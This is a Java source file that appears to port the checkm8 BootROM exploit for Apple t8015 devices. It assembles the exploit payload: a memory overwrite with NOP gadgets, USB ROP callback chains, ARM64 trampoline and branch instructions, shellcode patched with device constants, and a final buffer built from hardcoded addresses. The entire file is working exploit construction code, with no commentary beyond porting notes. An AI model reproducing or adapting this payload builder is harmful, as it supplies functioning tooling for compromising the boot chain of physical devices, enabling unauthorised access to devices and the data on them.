package queen.device;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Arrays;
import java.util.HexFormat;

import org.apache.commons.codec.DecoderException;
import org.apache.commons.codec.binary.Hex;
import org.apache.commons.io.HexDump;

import com.igormaznitsa.jbbp.io.JBBPByteOrder;
import static com.igormaznitsa.jbbp.io.JBBPOut.*;

public class ExploitConfig {
    final DeviceConfig deviceConfig;

    private final byte[] zero600 = new byte[0x600];
    private final byte[] zero500 = new byte[0x500];
    private final byte[] zero20  = new byte[0x20];
    private final byte[] zero10  = new byte[0x10];
    private final byte[] zeroC   = new byte[0xC];

    public ExploitConfig(
            DeviceConfig deviceConfig
    ) {
        this.deviceConfig = deviceConfig;
        Arrays.fill(zero600, (byte)0);
        Arrays.fill(zero500, (byte)0);
        Arrays.fill(zero20, (byte)0);
        Arrays.fill(zero10, (byte)0);
        Arrays.fill(zeroC, (byte)0);
    }

    // t8015-specific
    /**
     * Overwrite for deviceconfig.
     *  '\0' * 0x500 + struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)
     */
    public byte[] createOverwrite(Long nopGadget, Long address) throws IOException {
        return BeginBin(JBBPByteOrder.LITTLE_ENDIAN)    
        		.Byte(zero500)								// '\0' * 0x500
                .Byte(zero20)                               // 32x
                .Long(nopGadget, address)                   // 2Q
                .Byte(zero10)                               // 16x
                .Byte(zero20)                               // 32x
                .Long(nopGadget, address)                   // 2Q
                .Byte(zeroC)                                // 12x
                .Int(0xBEEFBEEF)                      		// I
                .End().toByteArray();
    }

    public byte[] usbRopCallbacks(Long address, Long funcGadget, Callback[] callbacks) throws IOException {
        ByteBuffer buffer = ByteBuffer.allocate(448).order(ByteOrder.LITTLE_ENDIAN);
        var buf = BeginBin(JBBPByteOrder.LITTLE_ENDIAN);
        Long addr = address;

        for (int i = 0; i < callbacks.length; i += 5) {
            var blk1 = BeginBin(JBBPByteOrder.LITTLE_ENDIAN);
            var blk2 = BeginBin(JBBPByteOrder.LITTLE_ENDIAN);
            for (int j = 0; j < 5; j++) {
                addr += 0x10;
                if (j == 4) {
                    address += 0x50;
                } else if ((i + j) < callbacks.length - 1) {
                    blk1.Long(funcGadget, addr);
                    blk2.Long(callbacks[i + j].getCallbackAddress(), callbacks[i + j].getFunctionAddress());
                } else if ((i + j) == callbacks.length - 1) {
                    blk1.Long(funcGadget, 0l);
                    blk2.Long(callbacks[i + j].getCallbackAddress(), callbacks[i + j].getFunctionAddress());
                } else {
                    blk1.Long(0l, 0l);
                }
            }

            buf.Byte(blk1.End().toByteArray()).Byte(blk2.End().toByteArray());
        }
        buffer.put(buf.End().toByteArray());
//        HexDump.dump(buffer.array(), 0, System.out, 0);
        return buffer.array();
    }

    // LDR X7, [PC, #OFFSET]
    // BR X7
    public byte[] asmArm64X7Trampoline(Long dest) throws IOException, DecoderException {
        return BeginBin(JBBPByteOrder.LITTLE_ENDIAN)
                .Byte(Hex.decodeHex("47000058E0001FD6"))
                .Long(dest)
                .End().toByteArray();
    }

    public byte[] asmArm64Branch(int src, int dest) throws IOException {
        if (src > dest) {
            return BeginBin(JBBPByteOrder.LITTLE_ENDIAN).Int(0x18000000 - (src - dest) / 4).End().toByteArray();
        } else {
            return BeginBin(JBBPByteOrder.LITTLE_ENDIAN).Int(0x14000000 - (dest - src) / 4).End().toByteArray();
        }
    }
    
    public byte[] loadBinary(String name) {
    	byte[] buf = new byte[0];
    	
    	File file = new File(Thread.currentThread().getContextClassLoader()
                .getResource(name + ".bin").getFile());
        int fileSize = 0;
        
        try (FileInputStream inputStream = new FileInputStream(file)) {
            fileSize = (int)inputStream.getChannel().size();
            buf = new byte[fileSize];
            inputStream.read(buf);
        } catch (FileNotFoundException e) {
            System.err.println("Could find file '" + name + "'\n" + e.getMessage());
            e.printStackTrace();
            System.exit(-1);
        } catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
        
        return buf;
    }

    public byte[] prepareShellcode(String name, Long[] constants) throws IOException {
        byte[] buf;
        if (name.startsWith("checkm8")) {
            buf = new byte[DeviceConfig.PAYLOAD_OFFSET_ARM64];
        } else {
            buf = new byte[DeviceConfig.PAYLOAD_SIZE_ARM64];
        }
        ByteBuffer buffer = ByteBuffer.wrap(buf).order(ByteOrder.LITTLE_ENDIAN);

        int size = 8;
        if (name.contains("_armv7")) {
            size = 4;
        }
        int placeholdersOffset;

        File file = new File(Thread.currentThread().getContextClassLoader()
                .getResource(name + ".bin").getFile());
        int fileSize = 0;
//        FileInputStream inputStream;

        try (FileInputStream inputStream = new FileInputStream(file)) {
            fileSize = (int)inputStream.getChannel().size();
            inputStream.read(buf);
        } catch (FileNotFoundException e) {
            System.err.println("Could find file '" + name + "'\n" + e.getMessage());
            e.printStackTrace();
            System.exit(-1);
        }
        assert fileSize > 0;

        placeholdersOffset = fileSize - size * constants.length;

        for (int i = 0; i < constants.length; i++) {
            int offset = placeholdersOffset + size * i;
            assert buffer.getInt(offset) == 0xBAD0001 + i;

            buffer.putLong(offset, constants[i]);
        }

        return buf;
    }

    byte[] prepareHandler(/* cpid */) throws IOException, DecoderException {
        byte[] trampoline = asmArm64X7Trampoline(deviceConfig.getHandleInterfaceRequest());
        byte[] branch = asmArm64Branch(0x10, 0x0);
        byte[] usbShellcode = prepareShellcode("usb_0xA1_2_arm64", deviceConfig.getUsbConstants());
        
        for (int i = 0; i < branch.length; i++) {
        	usbShellcode[i] = branch[i];
        }
        
//        System.out.println("trampoline:");
//        HexDump.dump(trampoline, 0, System.out, 0);
//        System.out.println();
//        
//        System.out.println("branch:");
//        HexDump.dump(branch, 0, System.out, 0);
//        System.out.println();
//        
//        System.out.println("usb shellcode:");
//        HexDump.dump(usbShellcode, 0, System.out, 0);
//        System.out.println();
        
        return BeginBin(JBBPByteOrder.LITTLE_ENDIAN)
                .Byte(trampoline)
                .Byte(usbShellcode)
                .End().toByteArray();
    }

    // pack: '<6Q16x448s1536x1024s'
    //  0x180020400-8, 0x1000006A5,
    //  0x180020600-8, 0x180000625,
    //  0x18000C600-8, 0x180000625,
    //  t8015_callback_data, t8015_shellcode
    public byte[] payload() throws IOException {
        byte[] callbackData = usbRopCallbacks(0x18001C020l, deviceConfig.getFuncGadget(), deviceConfig.getCallbacks());
        byte[] shellcode = prepareShellcode("checkm8_arm64", deviceConfig.getCheckm8Constants());
        byte[] handler;
		try {
			handler = prepareHandler();
			
	        // TODO: Assert lengths
	
//	        System.out.println(
//	                "callbackData size:\t" + callbackData.length + "\n" +
//	                        "shellcode size:\t\t" + shellcode.length + "\n" +
//	                        "handler size:\t\t" + handler.length + "\n"
//	        );
	
	        byte[] payload = BeginBin(JBBPByteOrder.LITTLE_ENDIAN)
	                .Long(
	                        0x180020400l-8,
	                        0x1000006A5l,
	                        0x180020600l-8,
	                        0x180000625l,
	                        0x18000C600l-8,
	                        0x180000625l
	                )
	                .Byte(zero10)
	                .Byte(callbackData)
	                .Byte(zero600)
	                .Byte(shellcode)
	                .Byte(handler)
	                .Align()
                .End().toByteArray();
	
//	        System.out.println(payload.length);
	        // HexDump.dump(payload, 0, System.out, 0);
	        return payload;
		} catch (DecoderException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			throw new IOException();
		}
    }
}
